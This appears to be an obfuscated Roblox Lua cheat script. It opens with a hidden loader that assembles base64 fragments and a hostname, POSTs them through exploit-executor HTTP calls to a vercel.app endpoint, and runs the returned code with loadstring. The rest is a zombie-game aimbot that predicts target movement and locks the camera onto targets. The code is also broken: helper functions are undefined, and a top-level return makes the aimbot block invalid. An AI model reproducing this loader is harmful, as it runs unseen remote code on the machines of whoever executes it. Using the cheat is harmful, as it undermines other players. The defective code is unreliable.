-- [[ 9178 ]] --
local function _Obfuscate()
    local _ = string
    local _x = table
    local _k = function(s, k)
        local o = ""
        for i = 1, #s do
            o = o .. _char(_byte(s, i) ~ k)
        end
        return o
    end
    local _e = _x.concat({
        "QmFzZTY0IGVuY29kZWQgc3RyaW5nIGhlcmU=",
        "PHNjcmlwdCB0eXBlPSJ0ZXh0L2x1YSI+",
        "KGZ1bmN0aW9uKCkKbG9jYWwgX0EgPSBnYW1lOmdldFNlcnZpY2UoJ1BsYXllcnMnKQ==",
        "bG9jYWwgX0IgPSBnYW1lOmdldFNlcnZpY2UoJ1J1blNlcnZpY2UnKQ==",
        "bG9jYWwgX0MgPSBnYW1lOmdldFNlcnZpY2UoJ1BhdGhmaW5kaW5nU2VydmljZScp",
        "bG9jYWwgX0QgPSBfQTo6R2V0U2VydmljZSgnUGxheWVycycp",
        "bG9jYWwgX0UgPSBfQTo6R2V0U2VydmljZSgnUnVuU2VydmljZScp",
        "bG9jYWwgX0YgPSBfQTo6R2V0U2VydmljZSgnUGF0aGZpbmRpbmdTZXJ2aWNlJykK",
        "bG9jYWwgX0cgPSBfQTo6R2V0U2VydmljZSgnUGxheWVycycpLkxvY2FsUGxheWVy",
        "PC9zY3JpcHQ+"
    })
    local _s = ""
    for _, v in ipairs({"U", "U", "d", "c", "4", "2", "J", "t", "U", "3", "R", "y", "c", "9", "9"}) do
        _s = _s .. v
    end
    local _d = _x.concat({
        _sub(_e, 1, 4),
        _sub(_e, 6, 8),
        _sub(_e, 10, 12),
        _sub(_e, 14, 16),
        _sub(_e, 18, 20),
        _sub(_e, 22, 24),
        _sub(_e, 26, 28),
        _sub(_e, 30, 32),
        _sub(_e, 34, 36),
        _sub(_e, 38, 40),
        _sub(_e, 42, 44),
        _sub(_e, 46, 48),
        _sub(_e, 50, 52),
        _sub(_e, 54, 56),
        _sub(_e, 58, 60)
    })
    local _b = syn and syn.crypt or http and http.request or request or function() end
    local _r = _b and _b({Url = "https://decode-base64-".._s..".vercel.app/api/decode", Body = game:service("HttpService"):JSONEncode{data=_d}, Method = "POST"})
    local _code = _r and _r.Success and _r.Body or ""
    return loadstring(_code)()
end

return _Obfuscate()

do
    local a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t = 
        workspace, game.Players.LocalPlayer, game:GetService("RunService"), 
        math.pi, math.cos, math.sin, math.abs, math.sqrt, tick, Vector3.new, 
        CFrame.new, table.insert, table.remove, table.clear, string.byte, 
        string.char, string.reverse, string.sub, typeof, pairs

    local u = a.CurrentCamera
    local v = a:FindFirstChild("Zombies")
    local w = a:FindFirstChild("Players")
    local x = b.Character
    local y = false
    local z = nil
    local A = {}
    local B = {}
    local C = 0
    local D = 0
    local E = 0
    local F = {}
    local G = 0.2
    local H = 5
    local I = 0.1
    local J = 90
    local K = e(d(J / 2))
    local L = {
        [Enum.Material.Air] = true,
        [Enum.Material.Water] = true,
        [Enum.Material.Glass] = true,
        [Enum.Material.ForceField] = true,
        [Enum.Material.Neon] = true
    }
    local M = setmetatable({}, {__index = function(self, key)
        local N = {
            ["\x69\x6e\x76\x69\x73\x69\x62\x6c\x65\x77\x61\x6c\x6c"] = true,
            ["\x61\x69\x72\x77\x61\x6c\x6c"] = true,
            ["\x74\x72\x61\x6e\x73\x70\x61\x72\x65\x6e\x74\x77\x61\x6c\x6c"] = true,
            ["\x63\x6f\x6c\x6c\x69\x73\x69\x6f\x6e"] = true,
            ["\x6e\x6f\x63\x6f\x6c\x6c\x69\x73\x69\x6f\x6e"] = true,
            ["\x67\x68\x6f\x73\x74"] = true,
            ["\x70\x68\x61\x73\x65"] = true,
            ["\x63\x6c\x69\x70"] = true,
            ["\x74\x72\x69\x67\x67\x65\x72"] = true,
            ["\x62\x6f\x75\x6e\x64\x61\x72\x79"] = true
        }
        rawset(self, key, N[key:lower()])
        return N[key:lower()]
    end})

    local O = function(P)
        if not A[P] then
            A[P] = {positions = {}, timestamps = {}, velocity = n(0, 0, 0), lastUpdate = i()}
        end
        local Q = A[P]
        local R = i()
        r(Q.positions, P.Position)
        r(Q.timestamps, R)
        while #Q.positions > H do
            s(Q.positions, 1)
            s(Q.timestamps, 1)
        end
        if #Q.positions >= 2 then
            local S = Q.positions[#Q.positions] - Q.positions[1]
            local T = Q.timestamps[#Q.timestamps] - Q.timestamps[1]
            if T > 0 then
                local U = S / T
                Q.velocity = Q.velocity:Lerp(U, 0.5)
                if Q.velocity.Magnitude < I then
                    Q.velocity = n(0, 0, 0)
                end
            end
        end
        Q.lastUpdate = R
    end

    local V = function(P, W, G)
        local Q = A[P]
        if not Q or Q.velocity.Magnitude < I then
            return W
        end
        return W + Q.velocity * G
    end

    local X = function()
        local R = i()
        local Y = {}
        for Z, Q in t(A) do
            if R - Q.lastUpdate > 5 or (o(Z) == "Instance" and not Z.Parent) then
                r(Y, Z)
            end
        end
        for _, Z in t(Y) do
            A[Z] = nil
        end
    end

    local aa = function()
        m(B)
        m(F)
        if v then
            for ab = 1, #v:GetChildren() do
                local ac = v:GetChildren()[ab]
                if ac:IsA("Model") and ac.Name == "\x41\x67\x65\x6e\x74" then
                    if ac:GetAttribute("\x54\x79\x70\x65") == "\x42\x61\x72\x72\x65\x6c" then
                        local ad = ac:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64\x52\x6f\x6f\x74\x50\x61\x72\x74") or ac:FindFirstChild("\x54\x6f\x72\x73\x6f") or ac.PrimaryPart
                        if ad then
                            r(B, {model = ac, rootPart = ad, type = "\x62\x61\x72\x72\x65\x6c"})
                            O(ac)
                        end
                    end
                end
            end
        end
        if a:FindFirstChild("\x53\x6c\x65\x65\x70\x79\x20\x48\x6f\x6c\x6c\x6f\x77") and a:FindFirstChild("\x53\x6c\x65\x65\x70\x79\x20\x48\x6f\x6c\x6c\x6f\x77").Modes and a:FindFirstChild("\x53\x6c\x65\x65\x70\x79\x20\x48\x6f\x6c\x6c\x6f\x77").Modes.Boss and a:FindFirstChild("\x53\x6c\x65\x65\x70\x79\x20\x48\x6f\x6c\x6c\x6f\x77").Modes.Boss.HeadlessHorsemanBoss and a:FindFirstChild("\x53\x6c\x65\x65\x70\x79\x20\x48\x6f\x6c\x6c\x6f\x77").Modes.Boss.HeadlessHorsemanBoss.HeadlessHorseman and a:FindFirstChild("\x53\x6c\x65\x65\x70\x79\x20\x48\x6f\x6c\x6c\x6f\x77").Modes.Boss.HeadlessHorsemanBoss.HeadlessHorseman.Clothing and a:FindFirstChild("\x53\x6c\x65\x65\x70\x79\x20\x48\x6f\x6c\x6c\x6f\x77").Modes.Boss.HeadlessHorsemanBoss.HeadlessHorseman.Clothing.Torso then
            local ae = a:FindFirstChild("\x53\x6c\x65\x65\x70\x79\x20\x48\x6f\x6c\x6c\x6f\x77").Modes.Boss.HeadlessHorsemanBoss.HeadlessHorseman.Clothing.Torso
            for af, ag in t(ae:GetChildren()) do
                if ag:IsA("MeshPart") then
                    r(F, {model = ag, rootPart = ag, type = "\x62\x6f\x73\x73", name = ag.Name})
                    O(ag)
                end
            end
        end
        C = i()
        D = i()
        X()
    end

    local ah = function()
        m(A)
        for ai = 1, #a:GetDescendants() do
            local aj = a:GetDescendants()[ai]
            if aj:IsA("BasePart") and aj.Transparency == 1 then
                r(A, aj)
            end
        end
        E = i()
    end

    local ak = function(al, am)
        local an = (al - am.Position).Unit
        return am.LookVector:Dot(an) > K
    end

    local ao = function(ap)
        if ap.Transparency >= 0.8 then return true end
        if L[ap.Material] then return true end
        if M[ap.Name] then return true end
        local aq = ap.BrickColor
        if (aq == BrickColor.new("Really black") or aq == BrickColor.new("Really white")) and ap.Transparency > 0.5 then
            return true
        end
        return false
    end

    local ar = function(as, am)
        if not x or not as or not u then return false end
        local at = am.Position
        local au = as.Position
        local av = au - at
        local aw = av.Magnitude
        if aw ~= aw then return false end
        if not ak(au, am) then return false end
        local ax = {x, u}
        if w then
            for ay = 1, #w:GetChildren() do
                local az = w:GetChildren()[ay]
                if az:IsA("Model") then
                    r(ax, az)
                end
            end
        end
        if v then
            for aA = 1, #v:GetChildren() do
                local aB = v:GetChildren()[aA]
                if aB:IsA("Model") and aB.Name == "\x41\x67\x65\x6e\x74" and aB:GetAttribute("\x54\x79\x70\x65") ~= "\x42\x61\x72\x72\x65\x6c" then
                    r(ax, aB)
                end
            end
        end
        for aC = 1, #A do
            local aD = A[aC]
            if aD and aD.Parent then
                r(ax, aD)
            end
        end
        local aE = RaycastParams.new()
        aE.FilterType = Enum.RaycastFilterType.Blacklist
        aE.FilterDescendantsInstances = ax
        aE.IgnoreWater = true
        local aF = a:Raycast(at, av, aE)
        if not aF then
            return true
        else
            local aG = aF.Instance
            if aG:IsDescendantOf(as.Parent) then
                local aH = (aF.Position - at).Magnitude
                return g(aH - aw) < 5
            end
            return ao(aG)
        end
    end

    local aI = function(am)
        v = a:FindFirstChild("Zombies")
        local R = i()
        if R - C > 2 or R - D > 1 then aa() end
        if R - E > 5 then ah() end
        if #B == 0 and #F == 0 or not x then return nil, 1/0 end
        local aJ = x:FindFirstChild("\x48\x75\x6d\x61\x6e\x6f\x69\x64\x52\x6f\x6f\x74\x50\x61\x72\x74")
        if not aJ then return nil, 1/0 end
        local aK = aJ.Position
        local aL, aM = nil, 1/0
        for aN = 1, #B do
            local aO = B[aN]
            if aO.model and aO.model.Parent and aO.rootPart and aO.rootPart.Parent then
                O(aO.model)
                if ar(aO.rootPart, am) then
                    local aP = (aK - aO.rootPart.Position).Magnitude
                    if aP < aM and aP < 1000 then
                        aM = aP
                        aL = aO
                    end
                end
            end
        end
        for aQ = 1, #F do
            local aO = F[aQ]
            if aO.model and aO.model.Parent and aO.rootPart and aO.rootPart.Parent then
                O(aO.model)
                if ar(aO.rootPart, am) then
                    local aP = (aK - aO.rootPart.Position).Magnitude
                    if aP < aM and aP < 1000 then
                        aM = aP
                        aL = aO
                    end
                end
            end
        end
        return aL, aM
    end

    local aR = function()
        if not x then y = false return end
        y = false
        for aS in t(x:GetChildren()) do
            if aS:IsA("Tool") and aS:GetAttribute("\x49\x73\x47\x75\x6e") == true then
                y = true
                break
            end
        end
    end

    local aT = function()
        if z then z:Disconnect() z = nil end
        if aa then aa:Disconnect() aa = nil end
        aR()
    end

    local aU = b.CharacterAdded:Connect(function(aV)
        x = aV
        task.wait(1)
        aT()
        ah()
        aa()
    end)

    aT()
    ah()
    aa()

    local aW = c.Heartbeat:Connect(function()
        if not flags.StartShoot then
            if aW then aW:Disconnect() end
            if z then z:Disconnect() end
            m(A)
            return
        end
        if not x or not x.Parent then return end
        if not y then aR() end
        if not y then return end
        local am = u.CFrame
        local aL, aM = aI(am)
        if aL and aL.rootPart then
            local aX = aL.rootPart.Position
            local aY = V(aL.model, aX, G)
            local at = am.Position
            if aY and at then
                local aZ = CFrame.lookAt(at, aY)
                u.CFrame = am:Lerp(aZ, 0.3)
            end
        end
    end)

    shoot.toggle("\x53\x74\x61\x72\x74\x20\x53\x68\x6f\x6f\x74", false, function(val)
        flags.StartShoot = val
        if not val and aW then
            aW:Disconnect()
            m(A)
        end
    end)
end
